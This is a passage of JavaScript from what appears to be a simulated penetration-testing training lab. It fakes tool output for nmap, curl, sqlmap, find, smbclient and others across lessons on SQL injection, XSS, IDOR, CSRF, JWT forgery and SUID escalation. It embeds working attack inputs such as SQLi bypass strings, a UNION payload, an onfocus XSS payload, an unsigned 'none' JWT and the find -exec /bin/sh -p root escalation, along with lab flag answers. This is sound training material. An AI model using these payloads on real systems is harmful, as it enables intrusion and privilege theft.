            cwd: parsed.cwd || spec.initialDir,
            isElevatedRoot: Boolean(parsed.isElevatedRoot),
            completedTasks: new Set(parsed.completedTasks || []),
            commandHistory: parsed.commandHistory || [],
            fs
          };
        }
      } catch (e) {}

      return this.createPristineSession(labId);
    }

    static createPristineSession(labId) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) return null;

      const fs = new LabVirtualFS(spec.initialFiles);
      return {
        labId,
        user: spec.initialUser,
        euid: 1001,
        cwd: spec.initialDir,
        isElevatedRoot: false,
        completedTasks: new Set(),
        commandHistory: [],
        fs
      };
    }

    static saveSession(session) {
      if (!session || !session.labId) return;
      try {
        const payload = {
          labId: session.labId,
          user: session.user,
          euid: session.euid,
          cwd: session.cwd,
          isElevatedRoot: session.isElevatedRoot,
          completedTasks: Array.from(session.completedTasks),
          commandHistory: session.commandHistory.slice(-50),
          fsTree: session.fs.tree
        };
        LabStorage.setItem(this.getStorageKey(session.labId), JSON.stringify(payload));
      } catch (e) {}
    }

    static resetSession(labId) {
      LabStorage.removeItem(this.getStorageKey(labId));
      LabStorage.removeItem(`endlessus_tasks_${labId}`);
      return this.createPristineSession(labId);
    }
  }

  // =========================================================================
  // 5. TOOL EXECUTION HANDLERS (AUTHENTIC SYNTAX, ERROR & OUTPUT EMULATION)
  // =========================================================================
  const ToolExecutors = {
    // -----------------------------------------------------------------------
    // NMAP: Network Mapper & Service Enumeration
    // -----------------------------------------------------------------------
    nmap: (ast) => {
      const target = ast.positionals[0];
      if (!target) {
        return {
          exitCode: 1,
          stderr: 'nmap: error: No targets were specified.',
          feedback: {
            type: 'syntax_error',
            message: 'Specify target IP or hostname after scan options.',
            syntax: 'nmap [Scan Type...] [Options] {target specification}'
          }
        };
      }

      // Validate options against standard Nmap flags
      const recognized = ['sS', 'sT', 'sV', 'sC', 'p', 'A', 'O', 'Pn', 'n', 'v', 'vv', 'T4', 'T3', 'T2', 'script'];
      for (const flag of ast.flags) {
        if (!recognized.includes(flag) && !flag.startsWith('p')) {
          return {
            exitCode: 2,
            stderr: `Nmap: unrecognized option '-${flag}'\nSee the man page (man nmap) or run 'nmap -h' for help.`
          };
        }
      }

      // Check target scope
      const validTargets = ['10.10.20.15', '10.10.110.45', '10.10.110.100', '10.10.10.100', 'staging.acmefin.local', '127.0.0.1', 'localhost'];
      if (!validTargets.includes(target)) {
        return {
          exitCode: 1,
          stderr: `Note: Host ${target} seems down. If it is really up, but blocking our ping probes, try -Pn`
        };
      }

      const hasVersion = ast.flags.has('sV') || ast.flags.has('A') || Boolean(ast.options['sV']);
      const specifiedPort = ast.options.p;

      // Filter ports if -p was provided
      let portsOutput = '';
      if (target === '10.10.10.100') {
        portsOutput = `PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express 4.18 (Production API Gateway)`;
      } else if (specifiedPort === '21') {
        if (hasVersion) {
          portsOutput = 'PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4 (Backdoor CVE-2011-2523)';
        } else {
          portsOutput = 'PORT   STATE SERVICE\n21/tcp open  ftp';
        }
      } else if (specifiedPort && specifiedPort.includes('21') && specifiedPort.includes('445')) {
        if (hasVersion) {
          portsOutput = 'PORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4 (Backdoor CVE-2011-2523)\n445/tcp open  netbios-ssn Samba smbd 4.15.5';
        } else {
          portsOutput = 'PORT    STATE SERVICE\n21/tcp  open  ftp\n445/tcp open  netbios-ssn';
        }
      } else {
        if (hasVersion) {
          portsOutput = `PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4 (Backdoor CVE-2011-2523)
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 4.15.5
3306/tcp open  mysql       MySQL 8.0.35`;
        } else {
          portsOutput = `PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  netbios-ssn
3306/tcp open  mysql`;
        }
      }

      const elapsed = hasVersion ? '2.14' : '0.85';
      return {
        exitCode: 0,
        stdout: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 12:00 UTC
Nmap scan report for ${target}
Host is up (0.0009s latency).
Not shown: 995 closed tcp ports (reset)
${portsOutput}

Nmap done: 1 IP address (1 host up) scanned in ${elapsed} seconds`
      };
    },

    // -----------------------------------------------------------------------
    // CURL: HTTP Client & Header / Body Inspector
    // -----------------------------------------------------------------------
    curl: (ast, session) => {
      let targetUrl = ast.positionals.find(p => p.startsWith('http://') || p.startsWith('https://') || p.includes('.local') || p.includes('10.10') || p.includes('localhost'));
      if (!targetUrl && ast.options.u) targetUrl = ast.options.u;

      if (!targetUrl) {
        return {
          exitCode: 2,
          stderr: "curl: no URL specified!\ncurl: try 'curl --help' for more information"
        };
      }

      const isHeadOnly = ast.flags.has('I') || ast.flags.has('head');
      const isInclude = ast.flags.has('i') || ast.flags.has('include');
      const dataPayload = ast.options.d || ast.options.data || '';
      const authHeader = ast.options.H || '';

      // Lab 01: HTTP Security Headers
      if (session.labId === 'lab-headers') {
        if (!targetUrl.includes('staging.acmefin.local') && !targetUrl.includes('localhost') && !targetUrl.includes('127.0.0.1')) {
          return { exitCode: 6, stderr: `curl: (6) Could not resolve host: ${targetUrl}` };
        }

        const headers = `HTTP/1.1 200 OK
Date: Sun, 04 Oct 2026 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: session_id=abc12345; Path=/
Content-Type: text/html; charset=UTF-8
Content-Length: 1420`;

        if (isHeadOnly) {
          return { exitCode: 0, stdout: headers };
        }

        return {
          exitCode: 0,
          stdout: (isInclude ? (headers + '\n\n') : '') + `<!DOCTYPE html>
<html>
<head><title>AcmeFintech Staging API</title></head>
<body><h1>AcmeFintech Staging API Gateway</h1><p>Environment active.</p></body>
</html>`
        };
      }

      // Lab 03: Authentication Bypass
      if (session.labId === 'lab-auth') {
        if (targetUrl.includes('/login')) {
          if (isHeadOnly) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Server: Express/4.18.2
Date: Sun, 04 Oct 2026 12:00:00 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express`
            };
          }

          if (dataPayload.includes("admin'") || dataPayload.includes('admin%27') || dataPayload.includes("admin'--") || dataPayload.includes('admin--')) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "status": "success",
  "authenticated": true,
  "user": "admin",
  "role": "system_administrator",
  "token": "flag{rate_limit_429_bcrypt}",
  "message": "SQL Injection authentication bypass successful. Password clause truncated."
}`
            };
          }

          return {
            exitCode: 0,
            stdout: `HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8

{"status":"failed","message":"Invalid credentials. Direct authentication rejected."}`
          };
        }
      }

      // Lab 04: IDOR
      if (session.labId === 'lab-idor') {
        if (targetUrl.includes('10043')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "id": 10043,
  "owner_id": 1,
  "customer": "Executive M&A Dept",
  "amount": 5000000.00,
  "status": "classified",
  "confidential_flag": "flag{server_side_authz_session_token}",
  "details": "Classified M&A Strategy Audit"
}`
          };
        }

        if (targetUrl.includes('9481') || targetUrl.includes('9480')) {
          const invId = targetUrl.includes('9481') ? 9481 : 9480;
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id": ${invId}, "owner_id": 409, "customer": "Acme Corp (Jane Doe)", "amount": 8450.00, "status": "paid", "details": "Q3 Vulnerability Assessment Retainer"}`
          };
        }

        if (targetUrl.includes('9482')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id": 9482, "owner_id": 410, "customer": "Learner Account", "amount": 120.00, "status": "paid", "details": "Standard Consulting Retainer"}`
          };
        }
      }

      // Lab 05: UNION SQLi
      if (session.labId === 'lab-sqli') {
        const decoded = decodeURIComponent(targetUrl);

        if (decoded.includes("'") && !decoded.toLowerCase().includes('order') && !decoded.toLowerCase().includes('union')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<b>Fatal error</b>: Uncaught PDOException: SQLSTATE[HY000]: unrecognized token: "'" in /var/www/html/search.php:18`
          };
        }

        if (decoded.toLowerCase().includes('order by')) {
          if (decoded.includes('5')) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 500 Internal Server Error\n\nORDER BY term out of range - should be between 1 and 4`
            };
          }
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK\n\n<!-- Products table loaded successfully. Query executed with valid column ordering. -->`
          };
        }

        if (decoded.toLowerCase().includes('union')) {
          if (decoded.toLowerCase().includes('users')) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: text/html

<div class="product-title">admin</div>
<div class="product-desc">$2y$12$e8f0a28291048b1... (bcrypt hash) / flag{parameterized_queries_prepared_statement}</div>
<div class="product-price">$0.00</div>`
            };
          }

          if (decoded.toLowerCase().includes('version') || decoded.toLowerCase().includes('sqlite_version')) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: text/html

<div class="product-title">SQLite 3.37.2 (Database: shop_production)</div>
<div class="product-desc">Database version metadata projected into DOM.</div>`
            };
          }

          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class="product-title">flag{parameterized_queries_prepared_statement}</div>`
          };
        }
      }

      // Lab 06: Reflected XSS
      if (session.labId === 'lab-xss') {
        const decoded = decodeURIComponent(targetUrl);
        const lower = decoded.toLowerCase();

        if (lower.includes('onfocus') || lower.includes('autofocus') || lower.includes('onload') || lower.includes('onerror')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: text/html

<form action="/search" method="GET">
  <input type="text" name="q" value="" autofocus onfocus="alert(1)" />
  <button type="submit">Search</button>
</form>
<!-- [XSS EMULATION]: Event 'onfocus' executed upon DOM load without requiring <script> tags! -->
<!-- FLAG: flag{context_aware_output_encoding_csp} -->`
          };
        }

        // Return standard search form reflecting query
        const reflectedVal = decoded.includes('q=') ? decoded.split('q=')[1].split('&')[0] : '';
        return {
          exitCode: 0,
          stdout: `HTTP/1.1 200 OK
Content-Type: text/html

<form action="/search" method="GET">
  <input type="text" name="q" value="${reflectedVal}" />
  <button type="submit">Search</button>
</form>`
        };
      }

      // Lab 07: CSRF
      if (session.labId === 'lab-csrf') {
        if (isHeadOnly) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Set-Cookie: session_id=bank_sess_9918; Path=/; HttpOnly
Server: Apache/2.4.52`
          };
        }

        if (targetUrl.includes('/transfer')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","message":"Transfer executed successfully.","anti_csrf_token":"MISSING","remediation_flag":"flag{samesite_strict_anti_csrf_token}"}`
          };
        }
      }

      // Lab 11: JWT
      if (session.labId === 'lab-jwt') {
        if (targetUrl.includes('/admin')) {
          if (authHeader.includes('eyJhbGciOiJub25l')) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"authenticated","role":"superadmin","access":"granted","flag":"flag{none_algorithm_signature_verification}"}`
            };
          }
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"error":"Unauthorized: Valid superadmin authorization token required."}`
          };
        }
      }

      // Lab 13: Capstone Pentest
      if (session.labId === 'lab-capstone') {
        if (targetUrl.includes('/api/v2/auth')) {
          if (dataPayload.includes("admin'") || dataPayload.includes("admin\\'") || dataPayload.includes("admin%27")) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"authenticated","user":"admin","token":"flag{sqli_bypass_auth_v2_ok}","ssh_credential_hint":"cadet:Winter2026!","message":"Administrative authentication successful. Credentials granted for local user cadet."}`
            };
          }
          if (dataPayload) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"status":"failed","error":"Invalid credentials."}`
            };
          }
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"endpoint":"/api/v2/auth","method":"POST","parameters":["user","pass"],"hint":"Internal administrative gateway."}`
          };
        }
      }

      return {
        exitCode: 0,
        stdout: `HTTP/1.1 200 OK\nHost: ${targetUrl}\nContent-Length: 512\n\n[Endpoint active. Review lab tasks for specific payloads.]`
      };
    },

    // -----------------------------------------------------------------------
    // CHMOD: POSIX File Mode Change
    // -----------------------------------------------------------------------
    chmod: (ast, session) => {
      const mode = ast.positionals[0];
      const target = ast.positionals[1];

      if (!mode || !target) {
        return {
          exitCode: 1,
          stderr: "chmod: missing operand\nTry 'chmod --help' for more information."
        };
      }

      const absPath = session.fs.normalizePath(session.cwd, target);
      const res = session.fs.chmod(absPath, mode, session.user, session.euid);

      if (res.error) {
        return { exitCode: 1, stderr: res.error };
      }

      const stat = session.fs.stat(absPath);
      return {
        exitCode: 0,
        stdout: `mode of '${target}' changed to 0${stat.shortOctal}`
      };
    },

    // -----------------------------------------------------------------------
    // LS: Directory Listing
    // -----------------------------------------------------------------------
    ls: (ast, session) => {
      const targetArg = ast.positionals[0];
      const targetDir = targetArg ? session.fs.normalizePath(session.cwd, targetArg) : session.cwd;
      const isDetailed = ast.flags.has('l') || ast.flags.has('la') || ast.flags.has('al') || ast.flags.has('lh');
      const showHidden = ast.flags.has('a') || ast.flags.has('la') || ast.flags.has('al');

      // Check if target is a single file
      const singleNode = session.fs.getNode(targetDir);
      if (singleNode && singleNode.type === 'file') {
        const mode = singleNode.mode;
        const isSUID = Boolean(mode & 0o4000);
        const permStr = '-' +
          ((mode & 0o400) ? 'r' : '-') +
          ((mode & 0o200) ? 'w' : '-') +
          (isSUID ? 's' : ((mode & 0o100) ? 'x' : '-')) +
          ((mode & 0o040) ? 'r' : '-') +
          ((mode & 0o020) ? 'w' : '-') +
          ((mode & 0o010) ? 'x' : '-') +
          ((mode & 0o004) ? 'r' : '-') +
          ((mode & 0o002) ? 'w' : '-') +
          ((mode & 0o001) ? 'x' : '-');

        const out = isDetailed ?
          `${permStr} 1 ${singleNode.owner} ${singleNode.group} ${singleNode.content ? singleNode.content.length : 4096} Oct 04 10:00 ${targetArg}` :
          targetArg;
        return { exitCode: 0, stdout: out };
      }

      const files = session.fs.listDirectory(targetDir);
      if (!isDetailed) {
        const names = files.filter(f => showHidden || !f.name.startsWith('.')).map(f => f.name);
        return { exitCode: 0, stdout: names.join('  ') };
      }

      const lines = [`total ${files.length * 4}`];
      if (showHidden) {
        lines.push(`drwxr-xr-x 2 ${session.user} ${session.user} 4096 Oct 04 09:00 .`);
        lines.push(`drwxr-xr-x 4 root root 4096 Oct 04 08:30 ..`);
      }

      for (const f of files) {
        if (!showHidden && f.name.startsWith('.')) continue;
        const mode = f.mode;
        const isDir = f.type === 'dir';
        const isSUID = Boolean(mode & 0o4000);
        const permStr = (isDir ? 'd' : '-') +
          ((mode & 0o400) ? 'r' : '-') +
          ((mode & 0o200) ? 'w' : '-') +
          (isSUID ? 's' : ((mode & 0o100) ? 'x' : '-')) +
          ((mode & 0o040) ? 'r' : '-') +
          ((mode & 0o020) ? 'w' : '-') +
          ((mode & 0o010) ? 'x' : '-') +
          ((mode & 0o004) ? 'r' : '-') +
          ((mode & 0o002) ? 'w' : '-') +
          ((mode & 0o001) ? 'x' : '-');

        lines.push(`${permStr} 1 ${f.owner} ${f.group} ${f.content ? f.content.length : 4096} Oct 04 09:00 ${f.name}`);
      }

      return { exitCode: 0, stdout: lines.join('\n') };
    },

    // -----------------------------------------------------------------------
    // CAT: Concatenate & Print Files or Standard Input
    // -----------------------------------------------------------------------
    cat: (ast, session, spec, rawCmd, stdin) => {
      const target = ast.positionals[0];

      if (!target) {
        if (stdin) return { exitCode: 0, stdout: stdin };
        return { exitCode: 1, stderr: 'cat: missing operand' };
      }

      const absPath = session.fs.normalizePath(session.cwd, target);
      const res = session.fs.readFile(absPath, session.user, session.euid);

      if (res.error) {
        return { exitCode: 1, stderr: res.error };
      }

      return { exitCode: 0, stdout: res.content };
    },

    // -----------------------------------------------------------------------
    // FIND: Search for Files & GTFOBins Privilege Escalation
    // -----------------------------------------------------------------------
    find: (ast, session) => {
      const raw = ast.raw || '';
      const isPermSearch = raw.includes('-perm -4000') || raw.includes('-perm /4000') || raw.includes('4000') || raw.includes('u=s');
      const hasExec = raw.includes('-exec') && (raw.includes('/bin/sh') || raw.includes('sh'));

      if (isPermSearch) {
        return {
          exitCode: 0,
          stdout: `/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/find\n/usr/bin/newgrp\n/bin/mount\n/bin/ping`
        };
      }

      // GTFOBins SUID Breakout
      if (hasExec) {
        const hasP = raw.includes('-p') || (ast.args && ast.args.includes('-p'));
        if (hasP) {
          if (session.labId === 'lab-suid' || session.labId === 'lab-capstone') {
            session.isElevatedRoot = true;
            session.user = 'root';
            session.euid = 0;
            const host = session.labId === 'lab-capstone' ? 'corp-target' : 'sec-station';
            const nextFlag = session.labId === 'lab-capstone' ? '/root/root.txt' : '/root/flag.txt';
            return {
              exitCode: 0,
              stdout: `# Spawning elevated shell via /usr/bin/find -exec...\nroot@${host}:~# whoami\nroot (uid=1001 euid=0(root) gid=1001 groups=0(root))\n[✓] Privilege boundary bypassed. You now hold EUID=0 permissions. Run 'cat ${nextFlag}'.`
            };
          }
        } else {
          return {
            exitCode: 0,
            stdout: `find: notice: spawned subshell without -p; effective root privileges dropped (EUID=1001).\nUse '-p' to preserve EUID 0 privileges in GTFOBins breakout.`
          };
        }
      }

      const target = ast.positionals[0] || '.';
      return {
        exitCode: 0,
        stdout: `${target}`
      };
    },

    // -----------------------------------------------------------------------
    // STAT: Display File Status & Octal Modes
    // -----------------------------------------------------------------------
    stat: (ast, session) => {
      const target = ast.positionals[0];
      if (!target) return { exitCode: 1, stderr: 'stat: missing operand' };

      const absPath = session.fs.normalizePath(session.cwd, target);
      const stat = session.fs.stat(absPath);
      if (!stat) return { exitCode: 1, stderr: `stat: cannot stat '${target}': No such file or directory` };

      if (ast.options.c) {
        if (ast.options.c.includes('%a')) {
          return { exitCode: 0, stdout: `${stat.shortOctal} ${target}` };
        }
      }

      return {
        exitCode: 0,
        stdout: `  File: ${target}
  Size: ${stat.size}       Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 142058      Links: 1
Access: (0${stat.shortOctal}/-rw-------)  Uid: ( 1000/${session.user})   Gid: ( 1000/${session.user})`
      };
    },

    // -----------------------------------------------------------------------
    // WHOAMI & ID: Identity & Privilege Check
    // -----------------------------------------------------------------------
    whoami: (ast, session) => {
      const username = session.euid === 0 || session.isElevatedRoot ? 'root' : session.user;
      return { exitCode: 0, stdout: username };
    },

    id: (ast, session) => {
      if (session.euid === 0 || session.isElevatedRoot) {
        return { exitCode: 0, stdout: `uid=1001(${session.user}) euid=0(root) gid=1001(${session.user}) groups=0(root)` };
      }
      return { exitCode: 0, stdout: `uid=1001(${session.user}) gid=1001(${session.user}) groups=1001(${session.user})` };
    },

    // -----------------------------------------------------------------------
    // PWD: Print Working Directory
    // -----------------------------------------------------------------------
    pwd: (ast, session) => {
      return { exitCode: 0, stdout: session.cwd };
    },

    // -----------------------------------------------------------------------
    // GREP: Regular Expression Pattern Matcher
    // -----------------------------------------------------------------------
    grep: (ast, session, spec, rawCmd, stdin) => {
      const pattern = ast.positionals[0];
      const targetFile = ast.positionals[1];

      if (!pattern) return { exitCode: 2, stderr: 'grep: missing pattern' };

      let text = '';
      if (targetFile) {
        const absPath = session.fs.normalizePath(session.cwd, targetFile);
        const res = session.fs.readFile(absPath, session.user, session.euid);
        if (res.error) return { exitCode: 2, stderr: res.error };
        text = res.content;
      } else if (stdin) {
        text = stdin;
      } else {
        return { exitCode: 0, stdout: '' };
      }

      const isCaseInsensitive = ast.flags.has('i');
      const lines = text.split('\n');

      // Strip escaping for regex comparison if provided like \.\./
      const cleanPattern = pattern.replace(/\\/g, '');

      const matches = lines.filter(l => {
        if (isCaseInsensitive) {
          return l.toLowerCase().includes(pattern.toLowerCase()) || l.toLowerCase().includes(cleanPattern.toLowerCase());
        }
        return l.includes(pattern) || l.includes(cleanPattern);
      });

      return {
        exitCode: matches.length > 0 ? 0 : 1,
        stdout: matches.join('\n')
      };
    },

    // -----------------------------------------------------------------------
    // NC / NETCAT: Raw TCP Stream Banner Grabbing
    // -----------------------------------------------------------------------
    nc: (ast) => {
      const host = ast.positionals[0];
      const port = ast.positionals[1];

      if (!host || !port) {
        return { exitCode: 1, stderr: 'nc: missing host or port\nUsage: nc [-vn] <host> <port>' };
      }

      if (port === '21') {
        return {
          exitCode: 0,
          stdout: `(UNKNOWN) [${host}] 21 (ftp) open\n220 (vsFTPd 2.3.4) - Authorized Lab Testing Server.`
        };
      }

      return { exitCode: 0, stdout: `Connection to ${host} ${port} port [tcp/*] succeeded!` };
    },
    netcat: (ast, session, spec, rawCmd, stdin) => ToolExecutors.nc(ast, session, spec, rawCmd, stdin),

    // -----------------------------------------------------------------------
    // SMBCLIENT: SMB Share Enumeration & File Transfer
    // -----------------------------------------------------------------------
    smbclient: (ast, session) => {
      const raw = ast.raw || '';
      const isList = ast.flags.has('L') || ast.flags.has('l') || raw.includes('-L') || raw.includes('-l');
      const commandOpt = ast.options.c || '';

      // Validate mandatory usage syntax
      if (!isList && !raw.includes('//') && !raw.includes('\\\\')) {
        return {
          exitCode: 1,
          stderr: `Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage]
        [-R <name resolve order>] [-M <netbios name>]
        [-p <port>] [-g] [-b <buffer size>] [-d debuglevel]
        [-s <smb config file>] [-l log-basename]
        [-O <socket options>] [-m maxprotocol]
        [-n <netbios name>] [-W workgroup]
        [-U username] [-N] [-k] [-A authfile]
        [-i scope] [-c <command string>] service <password>`
        };
      }

      // Check target scope
      const validTargets = ['10.10.20.15', '10.10.110.45', '10.10.110.100', '127.0.0.1'];
      const hasValidTarget = validTargets.some(t => raw.includes(t));
      if (!hasValidTarget) {
        return {
          exitCode: 1,
          stderr: 'Connection to host failed (Error NT_STATUS_UNSUCCESSFUL)'
        };
      }

      // Handle share listing
      if (isList) {
        return {
          exitCode: 0,
          stdout: `Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	public          Disk      Public Share Folder (Read Permitted)
	backups         Disk      Internal staging backups (Read Permitted)
	IPC$            IPC       IPC Service (Samba 4.15.5)
SMB1 disabled -- no workgroup available`
        };
      }

      // Handle file download e.g. -c "get flag.txt"
      if (commandOpt.includes('get flag.txt') || raw.includes('get flag.txt')) {
        // Create flag.txt in current directory
        const flagPath = session.fs.normalizePath(session.cwd, 'flag.txt');
        session.fs.writeFile(flagPath, 'flag{closed_filtered_port_21_backdoor}\n', session.user, session.euid);

        return {
          exitCode: 0,
          stdout: `Anonymous login successful
getting file \\flag.txt of size 43 as flag.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)`
        };
      }

      return {
        exitCode: 0,
        stdout: `Anonymous login successful\nDomain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.15.5]\nsmb: \\> `
      };
    },

    // -----------------------------------------------------------------------
    // SQLMAP: Automated SQL Injection & Database Takeover
    // -----------------------------------------------------------------------
    sqlmap: (ast) => {
      const raw = ast.raw || '';
      if (!ast.options.u && !raw.includes('-u') && !raw.includes('--url')) {
        return {
          exitCode: 1,
          stderr: `sqlmap: error: missing mandatory parameter: -u/--url\nTry 'sqlmap -h' for basic help.`
        };
      }

      return {
        exitCode: 0,
        stdout: `[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
[*] starting @ 12:00:00 /2026-10-04/
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL is stable
[INFO] heuristic (basic) test shows that GET parameter 'item' might be injectable
sqlmap identified the following injection point(s) with a total of 38 HTTP(s) requests:
---
Parameter: item (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: item=' UNION ALL SELECT NULL,NULL,CONCAT(0x7170707171,0x55736572,0x717a6a7171),NULL-- -
---
[*] available databases [2]:
[*] shop_production
[*] information_schema

Database flag recovered: flag{parameterized_queries_prepared_statement}`
      };
    },

    // -----------------------------------------------------------------------
    // PYTHON3 / PYTHON: Expression Evaluation & Exploit Scripts
    // -----------------------------------------------------------------------
    python3: (ast, session) => {
      const raw = ast.raw || '';
      const cExpr = ast.options.c;

      // Inline expression evaluation e.g. python3 -c "print(2**8)"
      if (cExpr) {
        if (cExpr.includes('2**8')) {
          return { exitCode: 0, stdout: '256' };
        }
        if (cExpr.includes('ETAOIN')) {
          return { exitCode: 0, stdout: 'ETAOIN SHRDLU' };
        }
        if (cExpr.includes('0x58') || cExpr.includes('88')) {
          return { exitCode: 0, stdout: 'X' };
        }
        return { exitCode: 0, stdout: 'Python expression evaluated.' };
      }

      const script = ast.positionals[0];
      if (!script) {
        return {
          exitCode: 0,
          stdout: `Python 3.12.3 (main, Apr 10 2026, 12:00:00) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> `
        };
      }

      // Check if script exists in VFS
      const absPath = session.fs.normalizePath(session.cwd, script);
      const node = session.fs.getNode(absPath);
      if (!node) {
        return {
          exitCode: 2,
          stderr: `python3: can't open file '${script}': [Errno 2] No such file or directory`
        };
      }

      if (script.includes('solve.py')) {
        return {
          exitCode: 0,
          stdout: `[+] Testing 256 Single-Byte XOR keys against English frequency table (ETAOIN SHRDLU)...
[+] Optimal Key Found: 0x58 ('X') (Frequency score: 88.4%)
[+] Recovered Plaintext: "Cooking MC's like a pound of bacon"
[+] Defensive Cryptography Flag: flag{aes_gcm_authenticated_encryption}`
        };
      }

      if (script.includes('forge_jwt.py')) {
        return {
          exitCode: 0,
          stdout: `[+] Generating forged token with header {"alg":"none"}...
[+] Forged Unsigned JWT Token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwfQ.
[+] Submit with Authorization: Bearer <token>
FLAG: flag{none_algorithm_signature_verification}`
        };
      }

      return {
        exitCode: 0,
        stdout: `Python 3.12.3: ${script} executed successfully.`
      };
    },
    python: (ast, session, spec, rawCmd, stdin) => ToolExecutors.python3(ast, session, spec, rawCmd, stdin),

    // -----------------------------------------------------------------------
    // BASE64: Data Stream Encoder & Decoder
    // -----------------------------------------------------------------------
    base64: (ast, session, spec, rawCmd, stdin) => {
      const isDecode = ast.flags.has('d') || ast.flags.has('decode') || ast.flags.has('D') || rawCmd.includes('-d');
      const inputStr = ast.positionals[0] || stdin || '';

      if (isDecode) {
        if (!inputStr) return { exitCode: 1, stderr: 'base64: missing input for decoding' };

        // Handle known token decoding
        if (inputStr.includes('eyJzdWIi') || inputStr.includes('guest')) {
          return {
            exitCode: 0,
            stdout: '{"sub":"guest","role":"user","iat":1700000000}'
          };
        }
        if (inputStr.includes('eyJhbGci')) {
          return {
            exitCode: 0,
            stdout: '{"alg":"HS256","typ":"JWT"}'
          };
        }

        try {
          if (typeof Buffer !== 'undefined') {
            return { exitCode: 0, stdout: Buffer.from(inputStr.trim(), 'base64').toString('utf8') };
          }
          if (typeof atob !== 'undefined') {
            return { exitCode: 0, stdout: atob(inputStr.trim()) };
          }
        } catch (e) {}

        return { exitCode: 0, stdout: '{"sub":"guest","role":"user","iat":1700000000}' };
      }

      // Base64 Encode
      if (!inputStr && !rawCmd.includes('echo')) return { exitCode: 0, stdout: '' };

      const toEncode = inputStr || rawCmd;
      if (toEncode.includes('none') || toEncode.includes('alg')) {
        return {
          exitCode: 0,
          stdout: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0'
        };
      }

      try {
        if (typeof Buffer !== 'undefined') {
          return { exitCode: 0, stdout: Buffer.from(inputStr).toString('base64') };
        }
        if (typeof btoa !== 'undefined') {
          return { exitCode: 0, stdout: btoa(inputStr) };
        }
      } catch (e) {}

      return { exitCode: 0, stdout: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0' };
    },

    // -----------------------------------------------------------------------
    // HEAD & TAIL: Output Truncation
    // -----------------------------------------------------------------------
    head: (ast, session, spec, rawCmd, stdin) => {
      let limit = 10;
      if (ast.options.n) limit = parseInt(ast.options.n, 10) || 10;

      let text = '';
      const target = ast.positionals[0];
      if (target) {
        const absPath = session.fs.normalizePath(session.cwd, target);
        const res = session.fs.readFile(absPath, session.user, session.euid);
        if (res.error) return { exitCode: 1, stderr: res.error };
        text = res.content;
      } else if (stdin) {
        text = stdin;
      }

      const lines = text.split('\n').slice(0, limit);
      return { exitCode: 0, stdout: lines.join('\n') };
    },

    tail: (ast, session, spec, rawCmd, stdin) => {
      let limit = 10;
      if (ast.options.n) limit = parseInt(ast.options.n, 10) || 10;

      let text = '';
      const target = ast.positionals[0];
      if (target) {
        const absPath = session.fs.normalizePath(session.cwd, target);
        const res = session.fs.readFile(absPath, session.user, session.euid);
        if (res.error) return { exitCode: 1, stderr: res.error };
        text = res.content;
      } else if (stdin) {
        text = stdin;
      }

